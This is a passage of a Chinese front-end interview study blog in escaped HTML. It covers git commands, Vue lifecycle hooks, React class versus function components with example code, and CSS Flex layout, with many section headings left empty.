class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">初始化仓库</span><br>git init  <br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">切换到主分支</span><br>git checkout master<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">获取最新变更</span><br>git fetch origin<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">基于主分支创建dev分支</span><br>git checkout -b dev origin/master<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">添加到缓存</span><br>git add<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">提交到本地仓库</span><br>git commit -m &quot;备注&quot;<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">获取最新更新</span><br>git fetch origin<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-其他指令\"><a href=\"#2-其他指令\" class=\"headerlink\" title=\"2.其他指令\"></a>2.其他指令</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">查看仓库状态</span><br>git status<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">将某个工作区的文件添加暂存区</span><br>git add filename   或 git add . 全部<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">查看工作区和暂存区差异</span><br>git diff 分支/id/<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">查看历史记录</span><br>git log<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">代码回滚</span><br>git reset HEAD^  <br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">删除版本库文件</span><br>git rm filename<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">同步远程仓库</span><br>git push -u origin master<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">本地仓库推送到远程仓库</span><br>git remote add origin git@github.com:username/仓库名.git<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">克隆</span><br>git clone url<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">合并分支</span><br>git merge dev<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">删除分支</span><br>git branch -d dev<br><br><br><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"NodeJS相关\"><a href=\"#NodeJS相关\" class=\"headerlink\" title=\"NodeJS相关\"></a>NodeJS相关</h1><h3 id=\"1-node流\"><a href=\"#1-node流\" class=\"headerlink\" title=\"1.node流\"></a>1.node流</h3><h3 id=\"2-node如何写接口？\"><a href=\"#2-node如何写接口？\" class=\"headerlink\" title=\"2.node如何写接口？\"></a>2.node如何写接口？</h3><h3 id=\"3-express\"><a href=\"#3-express\" class=\"headerlink\" title=\"3.express\"></a>3.express</h3><h3 id=\"4-node常用模块\"><a href=\"#4-node常用模块\" class=\"headerlink\" title=\"4.node常用模块\"></a>4.node常用模块</h3><h1 id=\"VUE相关\"><a href=\"#VUE相关\" class=\"headerlink\" title=\"VUE相关\"></a>VUE相关</h1><h3 id=\"1-Vue生命周期\"><a href=\"#1-Vue生命周期\" class=\"headerlink\" title=\"1.Vue生命周期\"></a>1.Vue生命周期</h3><p><img src=\"https://cn.vuejs.org/assets/lifecycle.16e4c08e.png\" alt=\"组件生命周期图示\"></p>\n<ul>\n<li>beforeCreate:实例初始化完成，props解析之后，data()和computed等选项处理之前立即调用；此时不能获得DOM结点；</li>\n<li>created：Vue实例已经创建，响应式数据、计算属性、方法和侦听器已经设置完成；但是由于没有挂载，依旧不能获得DOM结点；</li>\n<li>beforeMount：组件内容被渲染拿到页面之前执行的函数，组件已经完成了其响应式状态的设置，但是还没有创建DOM结点；</li>\n<li>mounted：组件渲染之后自动执行，一般异步请求写这里；这个阶段数据和DOM都已经完成渲染；</li>\n<li>beforeUpdate：数据变化的时候执行的函数，此时变化后的数据还未渲染到页面上；</li>\n<li>updated：数据变化以后执行，变化的数据已经渲染到页面上；</li>\n<li>beforeUnmount：当Vue应用被销毁时，自动执行的函数；</li>\n<li>unmounted：当vue应用销毁后，且DOM完全销毁之后自动执行；</li>\n</ul>\n<p><img src=\"https://upload-images.jianshu.io/upload_images/24919918-2b75253c04f7b643.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp\" alt=\"img\"></p>\n<h3 id=\"2-路由守卫\"><a href=\"#2-路由守卫\" class=\"headerlink\" title=\"2.路由守卫\"></a>2.路由守卫</h3><h3 id=\"3-组件通信有哪些？\"><a href=\"#3-组件通信有哪些？\" class=\"headerlink\" title=\"3.组件通信有哪些？\"></a>3.组件通信有哪些？</h3><p><a href=\"https://blog.csdn.net/longfan_/article/details/125324201\">https://blog.csdn.net/longfan_/article/details/125324201</a></p>\n<blockquote>\n<p>一般分为如下关系：</p>\n<p>父子间通信；</p>\n<p>非父子间通信（兄弟，隔代）；</p>\n</blockquote>\n<ul>\n<li>props / $emit</li>\n</ul>\n<blockquote>\n<p>父组件通过props的方式向子组件传递数据，而通过$emit子组件可以像父组件通信；</p>\n<p>props只可以从上一级组件传递到下一级组件，即所谓的单向数据流，而且props只读，不可被修改，所有修改都会失效并警告；</p>\n<p>一、不应该在一个组组件内部改变prop，会破坏单向数据绑定；</p>\n</blockquote>\n<ul>\n<li></li>\n</ul>\n<h3 id=\"4-v-if与show区别\"><a href=\"#4-v-if与show区别\" class=\"headerlink\" title=\"4.v-if与show区别\"></a>4.v-if与show区别</h3><h3 id=\"5-VUE与React区别\"><a href=\"#5-VUE与React区别\" class=\"headerlink\" title=\"5.VUE与React区别\"></a>5.VUE与React区别</h3><h3 id=\"6-Vue-DIff算法\"><a href=\"#6-Vue-DIff算法\" class=\"headerlink\" title=\"6.Vue DIff算法\"></a>6.Vue DIff算法</h3><h3 id=\"7-Vue如何实现监听？\"><a href=\"#7-Vue如何实现监听？\" class=\"headerlink\" title=\"7.Vue如何实现监听？\"></a>7.Vue如何实现监听？</h3><h1 id=\"React相关\"><a href=\"#React相关\" class=\"headerlink\" title=\"React相关\"></a>React相关</h1><h3 id=\"1-类组件和函数组件\"><a href=\"#1-类组件和函数组件\" class=\"headerlink\" title=\"1.类组件和函数组件\"></a>1.类组件和函数组件</h3><ul>\n<li><h5 id=\"函数组件\"><a href=\"#函数组件\" class=\"headerlink\" title=\"函数组件\"></a>函数组件</h5></li>\n</ul>\n<blockquote>\n<p>使用JS函数创建的组件；</p>\n<p>首字母大写，React根据此区分组件和HTML元素；</p>\n<p>函数必须有返回值,不渲染内容需要返回null；</p>\n</blockquote>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jsx\"><span class=\"hljs-comment\">//普通函数</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Header</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>头部组件<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br>&#125;<br><span class=\"hljs-comment\">//箭头函数</span><br><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title function_\">Footer</span>=(<span class=\"hljs-params\"></span>)=&gt;&#123;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>Rooter<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><h5 id=\"类组件\"><a href=\"#类组件\" class=\"headerlink\" title=\"类组件\"></a>类组件</h5></li>\n</ul>\n<blockquote>\n<p>使用class语法创建的组件；</p>\n<p>首字母大写，必须继承React.Component父类；</p>\n<p>必须有render函数，返回UI结构，可返回null;</p>\n</blockquote>\n<h5 id=\"状态组件：\"><a href=\"#状态组件：\" class=\"headerlink\" title=\"状态组件：\"></a>状态组件：</h5><ul>\n<li>无状态组件不定义状态，没有组件生命周期，只负责渲染UI，Hooks出现后函数组件也可以有状态；性能较好；</li>\n<li>有状态组件可以定义自己的状态，拥有生命周期，能力更强；</li>\n</ul>\n<h5 id=\"类组件问题：\"><a href=\"#类组件问题：\" class=\"headerlink\" title=\"类组件问题：\"></a>类组件问题：</h5><ul>\n<li>处理this问题：绑定箭头函数、bind，声明箭头函数</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Component</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&quot;react&quot;</span>;<br> <br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">App</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_ inherited__\">Component</span> &#123;<br>  <span class=\"hljs-comment\">// 状态</span><br>  state = &#123;<br>    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span>,<br>  &#125;;<br>  <span class=\"hljs-comment\">// 事件处理函数</span><br>  <span class=\"hljs-title function_\">handleClick</span>(<span class=\"hljs-params\">e</span>) &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(e)<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">count</span>)<br>  &#125;<br>  <span class=\"hljs-title function_\">render</span>(<span class=\"hljs-params\"></span>) &#123;<br>    <span class=\"hljs-keyword\">return</span> (<br>      <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">+          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">onClick</span>=<span class=\"hljs-string\">&#123;(e)</span>=&gt;</span>this.handleClick(e)&#125;&gt;按钮<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">      <span class=\"hljs-tag\">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-title class_\">App</span>;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Component</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&quot;react&quot;</span>;<br> <br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">App</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_ inherited__\">Component</span> &#123;<br>  <span class=\"hljs-comment\">// 状态</span><br>  state = &#123;<br>    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span>,<br>  &#125;;<br>  <span class=\"hljs-comment\">// 事件处理函数</span><br>  <span class=\"hljs-title function_\">handleClick</span>(<span class=\"hljs-params\">e</span>) &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(e)<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">count</span>)<br>  &#125;<br>  <span class=\"hljs-title function_\">render</span>(<span class=\"hljs-params\"></span>) &#123;<br>    <span class=\"hljs-keyword\">return</span> (<br>      <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">+          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">onClick</span>=<span class=\"hljs-string\">&#123;this.handleClick.bind(this)&#125;</span>&gt;</span>按钮<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">      <span class=\"hljs-tag\">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-title class_\">App</span>;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">import</span> &#123; <span class=\"hljs-title class_\">Component</span> &#125; <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">&quot;react&quot;</span>;<br> <br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">App</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_ inherited__\">Component</span> &#123;<br>  <span class=\"hljs-comment\">// 状态</span><br>  state = &#123;<br>    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-number\">0</span>,<br>  &#125;;<br>  <span class=\"hljs-comment\">// 事件处理函数</span><br>+  handleClick = <span class=\"hljs-function\">(<span class=\"hljs-params\">e</span>) =&gt;</span> &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(e)<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">count</span>)<br>  &#125;<br>  <span class=\"hljs-title function_\">render</span>(<span class=\"hljs-params\"></span>) &#123;<br>    <span class=\"hljs-keyword\">return</span> (<br>      <span class=\"language-xml\"><span class=\"hljs-tag\">&lt;&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>计数器：&#123;this.state.count&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">onClick</span>=<span class=\"hljs-string\">&#123;this.handleClick&#125;</span>&gt;</span>按钮<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">      <span class=\"hljs-tag\">&lt;/&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> <span class=\"hljs-title class_\">App</span>;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>setState</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br>handleClick = <span class=\"hljs-function\">() =&gt;</span> &#123;<br>  <span class=\"hljs-comment\">// 修改数据</span><br>  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">setState</span>(&#123;<br>    <span class=\"hljs-comment\">// key是要修改的数据名称，value是对应的新值</span><br>    <span class=\"hljs-attr\">count</span>: <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">count</span> + <span class=\"hljs-number\">1</span>,<br>  &#125;);<br>&#125;;<br>updateList = <span class=\"hljs-function\">() =&gt;</span> &#123;<br>  <span class=\"hljs-comment\">// 修改列表</span><br>  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">setState</span>(&#123;<br>    <span class=\"hljs-attr\">list</span>: [...<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">list</span>, <span class=\"hljs-string\">&#x27;相机&#x27;</span>],<br>  &#125;);<br>&#125;;<br>updateUser = <span class=\"hljs-function\">() =&gt;</span> &#123;<br>  <span class=\"hljs-comment\">// 修改对象</span><br>  <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">setState</span>(&#123;<br>    <span class=\"hljs-attr\">user</span>: &#123;<br>      ...<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">state</span>.<span class=\"hljs-property\">user</span>,<br>      <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">&#x27;tony&#x27;</span>,<br>    &#125;,<br>  &#125;);<br>&#125;;<br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"相同点\"><a href=\"#相同点\" class=\"headerlink\" title=\"相同点\"></a>相同点</h5><ul>\n<li>都可以接受属性，返回React元素；</li>\n</ul>\n<h5 id=\"不同点\"><a href=\"#不同点\" class=\"headerlink\" title=\"不同点\"></a>不同点</h5><ul>\n<li>编程思想不同，类组件需要创建实例，基于面向对象的编程方法，而函数式是基于函数式编程；</li>\n<li>内存占用不用：类组件需要创建并保存实例，会占用一定内存，函数组件不需要创建实例，可以节约内存占用；</li>\n<li>捕获特性：函数组件具有值捕获特性；</li>\n<li>状态：类组件有自己的实例，可以定义状态，而且可以修改状态更新组件，函数式组件以前没有状态，现在可以使用 useState 使用状态</li>\n<li>生命周期：类组件有自己完整的生命周期，可以在生命周期内编写逻辑，函数组件以前没有生命周期，现在可以使用 useEffect 实现类似生命周期的功能</li>\n<li>逻辑复用：类组件可以通过继承实现逻辑复用，但官方推荐组件优于继承，函数组件可以通过自定义 hooks 实现逻辑的复用</li>\n<li>跳过更新：类组件可以通过 <code>shouldComponentUpdate</code> 和 <code>PureComponent</code> 来跳过更新，而函数式组件可以使用 <code>React.memo</code> 来跳过更新</li>\n<li>发展前景：未来函数式组件将会成为主流，因为它可以更好的屏蔽 this 问题、规范和复用逻辑，更好的适合事件分片和并发渲染</li>\n</ul>\n<h3 id=\"2-React-Hook及其优化策略\"><a href=\"#2-React-Hook及其优化策略\" class=\"headerlink\" title=\"2.React Hook及其优化策略\"></a>2.React Hook及其优化策略</h3><h1 id=\"Webpack相关\"><a href=\"#Webpack相关\" class=\"headerlink\" title=\"Webpack相关\"></a>Webpack相关</h1><h3 id=\"1-Webpack配置\"><a href=\"#1-Webpack配置\" class=\"headerlink\" title=\"1.Webpack配置\"></a>1.Webpack配置</h3><h3 id=\"2-loader执行顺序\"><a href=\"#2-loader执行顺序\" class=\"headerlink\" title=\"2.loader执行顺序\"></a>2.loader执行顺序</h3><h3 id=\"3-html-webpack-plugin的作用\"><a href=\"#3-html-webpack-plugin的作用\" class=\"headerlink\" title=\"3.html webpack plugin的作用\"></a>3.html webpack plugin的作用</h3><h1 id=\"计算机网络相关\"><a href=\"#计算机网络相关\" class=\"headerlink\" title=\"计算机网络相关\"></a>计算机网络相关</h1><h3 id=\"1-CDN的理解\"><a href=\"#1-CDN的理解\" class=\"headerlink\" title=\"1.CDN的理解\"></a>1.CDN的理解</h3><h3 id=\"2-跨域问题：什么是跨域？如何解决？\"><a href=\"#2-跨域问题：什么是跨域？如何解决？\" class=\"headerlink\" title=\"2.跨域问题：什么是跨域？如何解决？\"></a>2.跨域问题：什么是跨域？如何解决？</h3><h3 id=\"3-节流与防抖\"><a href=\"#3-节流与防抖\" class=\"headerlink\" title=\"3.节流与防抖\"></a>3.节流与防抖</h3><h3 id=\"4-TCP和UDP区别，三次握手，阻塞重传\"><a href=\"#4-TCP和UDP区别，三次握手，阻塞重传\" class=\"headerlink\" title=\"4.TCP和UDP区别，三次握手，阻塞重传\"></a>4.TCP和UDP区别，三次握手，阻塞重传</h3><h3 id=\"5-http和https\"><a href=\"#5-http和https\" class=\"headerlink\" title=\"5.http和https\"></a>5.http和https</h3><h1 id=\"操作系统\"><a href=\"#操作系统\" class=\"headerlink\" title=\"操作系统\"></a>操作系统</h1><h3 id=\"1-线程、进程\"><a href=\"#1-线程、进程\" class=\"headerlink\" title=\"1.线程、进程\"></a>1.线程、进程</h3><h1 id=\"网络安全相关\"><a href=\"#网络安全相关\" class=\"headerlink\" title=\"网络安全相关\"></a>网络安全相关</h1><h3 id=\"1-DDOS\"><a href=\"#1-DDOS\" class=\"headerlink\" title=\"1.DDOS\"></a>1.DDOS</h3><h3 id=\"2-Web相关漏洞原理\"><a href=\"#2-Web相关漏洞原理\" class=\"headerlink\" title=\"2.Web相关漏洞原理\"></a>2.Web相关漏洞原理</h3><h1 id=\"算法相关\"><a href=\"#算法相关\" class=\"headerlink\" title=\"算法相关\"></a>算法相关</h1><h1 id=\"Linux相关\"><a href=\"#Linux相关\" class=\"headerlink\" title=\"Linux相关\"></a>Linux相关</h1><h3 id=\"1-linux常用命令\"><a href=\"#1-linux常用命令\" class=\"headerlink\" title=\"1.linux常用命令\"></a>1.linux常用命令</h3><h1 id=\"项目相关\"><a href=\"#项目相关\" class=\"headerlink\" title=\"项目相关\"></a>项目相关</h1><h3 id=\"1-项目上线如何捕获异常？\"><a href=\"#1-项目上线如何捕获异常？\" class=\"headerlink\" title=\"1.项目上线如何捕获异常？\"></a>1.项目上线如何捕获异常？</h3><h3 id=\"2-项目加载头花\"><a href=\"#2-项目加载头花\" class=\"headerlink\" title=\"2.项目加载头花\"></a>2.项目加载头花</h3>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前端三大件\"><a href=\"#前端三大件\" class=\"headerlink\" title=\"前端三大件\"></a>前端三大件</h1><h2 id=\"一、HTML\"><a href=\"#一、HTML\" class=\"headerlink\" title=\"一、HTML\"></a>一、HTML</h2><h2 id=\"二、CSS\"><a href=\"#二、CSS\" class=\"headerlink\" title=\"二、CSS\"></a>二、CSS</h2><h3 id=\"1-Flex布局\"><a href=\"#1-Flex布局\" class=\"headerlink\" title=\"1.Flex布局\"></a>1.Flex布局</h3><blockquote>\n<p>Flex布局包括容器和Item两部分；一个容器的所有子元素都成为他的item成员；</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/16/1d4271c9004b7a95.png\"></p>\n<ul>\n<li>flex-direction:主轴方向，row，row-reverse，column，column-recerse；</li>\n<li>flex-wrap:默认所有的容器里的Item都在一条线上，一行放不下可以换行：nowrap（默认不换行）wrap（换行，第一行在上）</li>\n<li>flex-flow:前两者的缩写，默认row nowrap</li>\n<li>justify-content:主轴对其方式，有五个值，flex-start:主轴起始位置对齐；flex-end:主轴结束位置对齐；center:居中；space-between:始末位置各一个，中间按照平均间距防止；space-around:每个item周围的间隔相同；</li>\n<li>align-items:纵轴如何对齐，五个值：flex-start:从最上方开始，排列row；flex-end:最底下开始；center:中间线；baseline:项目的第一行文字的基线对其；stretch:默认，item妹有设置高度或者auto，占满容器；</li>\n<li>align-content:定义多根轴线对齐方式，一行则不生效；</li>\n<li>order属性：属于item，按照order大小排序；</li>\n<li>flex-grow:定义item的放大比例；</li>\n<li>flex-shrink:按照比例缩小；</li>\n<li>flex: flex-grow,flex-shrink,flex-basis;</li>\n<li>align-self:允许item自己的属性；可覆盖aligin-items;</li>\n</ul>\n<h3 id=\"2-CSS预处理器\"><a href=\"#2-CSS预处理器\" class=\"headerlink\" title=\"2.CSS预处理器\"></a>2.CSS预处理器</h3><blockquote>\n<p>CSS预处理器式一种基于CSS，用于解决CSS难以解决的问题的Domian Specific Language;</p>\n<p>通过用一种专门的编程语言，为CSS添加一些编程特性，再编译成CSS文件；</p>\n<p>如：语法不够强大，妹有变量和合理的样式复用机制等；</p>\n</blockquote>\n<h5 id=\"CSS预处理器的作用\"><a href=\"#CSS预处理器的作用\" class=\"headerlink\" title=\"CSS预处理器的作用\"></a>CSS预处理器的作用</h5><ul>\n<li>提供css缺失的样式层复用机制，减少冗余代码；</li>\n<li>提高样式代码的可维护性；</li>\n</ul>\n<h5 id=\"Sass（-scss）\"><a href=\"#Sass（-scss）\" class=\"headerlink\" title=\"Sass（.scss）\"></a>Sass（.scss）</h5><p>成熟稳定强大的专业级CSS拓展语言，兼容CSS、功能丰富；</p>\n<p>功能：</p>\n<ul>\n<li>变量、常量</li>\n</ul>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 